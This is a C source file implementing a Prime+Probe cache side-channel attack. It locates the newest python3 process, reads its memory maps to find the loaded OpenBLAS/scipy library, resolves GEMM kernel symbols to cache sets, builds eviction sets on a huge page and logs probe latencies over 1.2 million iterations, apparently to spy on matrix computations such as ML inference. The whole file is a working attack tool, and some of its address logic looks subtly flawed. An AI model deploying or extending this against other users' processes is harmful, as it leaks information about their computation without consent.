#define _GNU_SOURCE
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <dirent.h>
#include <limits.h>
#include <dlfcn.h>
#include <link.h>
#include <inttypes.h>
#include <x86intrin.h>  // for __rdtsc()

#define CACHE_LINE_SIZE 64
#define LLC_CACHE_SETS 16384
#define LLC_WAYS 12


#define HUGEPAGE_SIZE (2 * 1024 * 1024)  // 2 MiB
#define CACHE_LINE_SIZE 64
#define NUM_CACHE_SETS 16384  // Typical for a 12 MB L3 cache with 64B cache line size and 16-way associativity
#define CACHE_LINE_SIZE 64
#define NUM_PRIME_PROBE_REPETITIONS 100




// Function to get the latest Python PID
int get_latest_python_pid() {
    FILE *fp;
    char path[1035];
    int pid = -1;

    fp = popen("pgrep -n python3", "r");
    if (fp == NULL) {
        perror("Failed to run pgrep command");
        return -1;
    }

    if (fgets(path, sizeof(path), fp) != NULL) {
        pid = atoi(path);
    }

    pclose(fp);
    return pid;
}

// Function to find the exact OpenBLAS library path
int get_openblas_path(int pid, char *libpath, size_t size) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "lsof -p %d | grep scipy | awk '{print $9}'", pid);

    FILE *fp = popen(cmd, "r");
    if (fp == NULL) {
        perror("Failed to run lsof command");
        return -1;
    }

    if (fgets(libpath, size, fp) != NULL) {
        libpath[strcspn(libpath, "\n")] = '\0';  // Remove newline
        pclose(fp);
        return 0;
    }

    pclose(fp);
    return -1;
}

// Function to get base address of the loaded library
uintptr_t get_lib_base(pid_t pid, const char *partial_name) {
    char map_path[64];
    snprintf(map_path, sizeof(map_path), "/proc/%d/maps", pid);
    FILE *maps = fopen(map_path, "r");
    if (!maps) {
        perror("fopen");
        return 0;
    }

    char line[512];
    while (fgets(line, sizeof(line), maps)) {
        if (strstr(line, partial_name)) {
            uintptr_t base;
            sscanf(line, "%lx-", &base);
            fclose(maps);
            return base;
        }
    }

    fclose(maps);
    return 0;
}



// find kernel function offsets
uintptr_t find_kernel_function_cache_sets(const char *libpath, uintptr_t lib_base) {
    FILE *fp;
    char cmd[512], line[512];
    snprintf(cmd, sizeof(cmd), "nm -D --defined-only %s | grep dgemm_kernel_HASWELL", libpath);

    fp = popen(cmd, "r");
    if (!fp) {
        perror("popen for nm");
        return 0;
    }

    printf("\n[+] GEMM Kernel function used for compute:\n");

    while (fgets(line, sizeof(line), fp)) {
        uintptr_t func_offset;
        char symbol[256];

        if (sscanf(line, "%lx %*c %s", &func_offset, symbol) == 2) {
            uintptr_t absolute_address = lib_base + func_offset;
            uintptr_t cache_set = (absolute_address >> 6) & (LLC_CACHE_SETS - 1);

            printf("Function %-30s Offset: 0x%lx  Cache Set: %lu\n", symbol, func_offset, cache_set);
            return cache_set;
        }
    }

    pclose(fp);
    return 0;
}





// Map huge pages
void* map_hugepage() {
    void* addr = mmap(NULL, HUGEPAGE_SIZE, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    if (addr == MAP_FAILED) {
        perror("Huge page mapping failed");
        return NULL;
    }
    return addr;
}

// Calculate the cache set index from a virtual address
int calculate_cache_set(void* addr) {
    uintptr_t va = (uintptr_t)addr;
    return (va / CACHE_LINE_SIZE) % NUM_CACHE_SETS;
}

// Perform pointer chasing through a linked list to measure latency
uint64_t measure_latency(uint64_t *head) {
    uint64_t start, end;
    volatile uint64_t *ptr = head;

    start = __rdtsc();
    for (int i = 0; i < LLC_WAYS; i++) {
        ptr = (uint64_t *)(*ptr); // Pointer chasing
    }
    end = __rdtsc();

    return end - start;
}


// Function to find function offset using dlopen and dlsym
uintptr_t find_function_offset(const char* libpath, const char* func_name) {
    void* handle = dlopen(libpath, RTLD_LAZY);
    if (!handle) {
        fprintf(stderr, "Error: Unable to open library %s\n", libpath);
        return 0;
    }

    void* func_addr = dlsym(handle, func_name);
    if (!func_addr) {
        fprintf(stderr, "Error: Unable to find function %s\n", func_name);
        dlclose(handle);
        return 0;
    }

    uintptr_t offset = (uintptr_t)func_addr;
    dlclose(handle);
    return offset;
}

// Wait for N CPU cycles
static __inline__ uint64_t rdtsc(void) {
    unsigned int lo, hi;
    __asm__ volatile ("rdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}

void wait_cycles(uint64_t cycles) {
    uint64_t start = rdtsc();
    while (rdtsc() - start < cycles);
}


static inline uint64_t rdtscp() {
    unsigned int aux;
    unsigned int lo, hi;
    __asm__ __volatile__ ("rdtscp" : "=a" (lo), "=d" (hi), "=c" (aux) ::);
    return ((uint64_t)hi << 32) | lo;
}


int main() {
    int pid = get_latest_python_pid();
    if (pid == -1) {
        fprintf(stderr, "Failed to find running Python process.\n");
        return 1;
    }
    printf("Detected Python PID: %d\n", pid);

    char libpath[PATH_MAX];
    if (get_openblas_path(pid, libpath, sizeof(libpath)) == -1) {
        fprintf(stderr, "Failed to find base address of OpenBLAS library.\n");
        return 1;
    }
    printf("OpenBLAS library path: %s\n", libpath);
    
    // Get base address
    const char *basename = strrchr(libpath, '/');
    if (basename) basename++; 
    else basename = libpath;
    
    uintptr_t lib_base = get_lib_base(pid, basename);
    
    if (!lib_base) {
        fprintf(stderr, "Failed to get base address of OpenBLAS base address\n");
        return 1;
    }
    printf("OpenBLAS base address: 0x%lx\n", lib_base);
    
    
    // Extract kernel symbols and cache sets
    uintptr_t kernel_cache_set= find_kernel_function_cache_sets(libpath, lib_base);
    if (!kernel_cache_set) {
        fprintf(stderr, "Failed to get kernel cache_set\n");
        return 1;
    }

    void* hugepage = map_hugepage();
    if (!hugepage) {
        fprintf(stderr, "Huge page allocation failed.\n");
        return 1;
    }
    printf("Huge page loaded at address: %p\n", hugepage);

    uintptr_t itcopy_offset = find_function_offset(libpath, "sgemm_itcopy_SANDYBRIDGE");
    uintptr_t oncopy_offset = find_function_offset(libpath, "cgemm3m_oncopyb_SKYLAKEX");

    if (itcopy_offset == 0 || oncopy_offset == 0) {
        fprintf(stderr, "Failed to find function offsets.\n");
        return 1;
    }

    printf("Function 'itcopy' offset: 0x%lx\n", itcopy_offset);
    printf("Function 'oncopy' offset: 0x%lx\n", oncopy_offset);

    int itcopy_cache_set = calculate_cache_set((void*)itcopy_offset);
    int oncopy_cache_set = calculate_cache_set((void*)oncopy_offset);

    printf("Cache set for 'itcopy': %d\n", itcopy_cache_set);
    printf("Cache set for 'oncopy': %d\n", oncopy_cache_set);
    printf("Cache set for 'kernel': %lu\n", kernel_cache_set);
    

    // extended code for prime and probe




    // Prime+Probe routine
    // Allocate and build pointer-chasing eviction sets
    uint64_t *itcopy_set[LLC_WAYS];
    uint64_t *oncopy_set[LLC_WAYS];
    uint64_t *kernel_set[LLC_WAYS];
    
    for (int i = 0; i < LLC_WAYS; i++) {
        itcopy_set[i] = (uint64_t *)((char *)hugepage + (itcopy_cache_set * CACHE_LINE_SIZE) + (i * 8192));
        oncopy_set[i] = (uint64_t *)((char *)hugepage + (oncopy_cache_set * CACHE_LINE_SIZE) + (i * 8192));
        kernel_set[i] = (uint64_t *)((char *)hugepage + (kernel_cache_set * CACHE_LINE_SIZE) + (i * 8192));
    }
    

    
    // Link the eviction sets (pointer chasing)
    for (int i = 0; i < LLC_WAYS - 1; i++) {
        *itcopy_set[i] = (uint64_t)itcopy_set[i + 1];
        *oncopy_set[i] = (uint64_t)oncopy_set[i + 1]; 
        *kernel_set[i] = (uint64_t)kernel_set[i + 1];
    }
    *itcopy_set[LLC_WAYS - 1] = (uint64_t)itcopy_set[0]; // Make it circular
    *oncopy_set[LLC_WAYS - 1] = (uint64_t)oncopy_set[0];
    *kernel_set[LLC_WAYS - 1] = (uint64_t)kernel_set[0];


    // create a file to record time and latency value
    FILE *spike_log = fopen("spike_log.txt", "w");
    if (!spike_log) {
        perror("Failed to open spike_log.txt");
        exit(1);
    }

    // Prime and Probe loop
    for (int iter = 0; iter < 1200000; iter++) {
        uint64_t itcopy_latency = measure_latency(itcopy_set[0]);
        uint64_t oncopy_latency = measure_latency(oncopy_set[0]);
        uint64_t kernel_latency = measure_latency(kernel_set[0]);
        
        // ---- WAIT ----
        wait_cycles(2000); // 2500000 ≈ 2.5 million cycles ≈ 510 µs at 4.9 GHz
        
        uint64_t itcopy_probe = measure_latency(itcopy_set[0]);
        uint64_t oncopy_probe = measure_latency(oncopy_set[0]);
        uint64_t kernel_probe = measure_latency(kernel_set[0]);


        /*printf("Iteration %d:\n", iter);
        printf("  itcopy (avg): %" PRIu64 " cycles\n", itcopy_probe);
        printf("  oncopy (avg): %" PRIu64 " cycles\n", oncopy_probe);
        printf("  kernel (avg): %" PRIu64 " cycles\n", kernel_probe);*/

        
        // write in spike_log.txt file
        
        uint64_t timestamp = rdtscp();
        fprintf(spike_log, "%lu %lu %lu %lu\n", timestamp, itcopy_probe, oncopy_probe, kernel_probe);

        
    }
    fclose(spike_log);


    return 0;
}

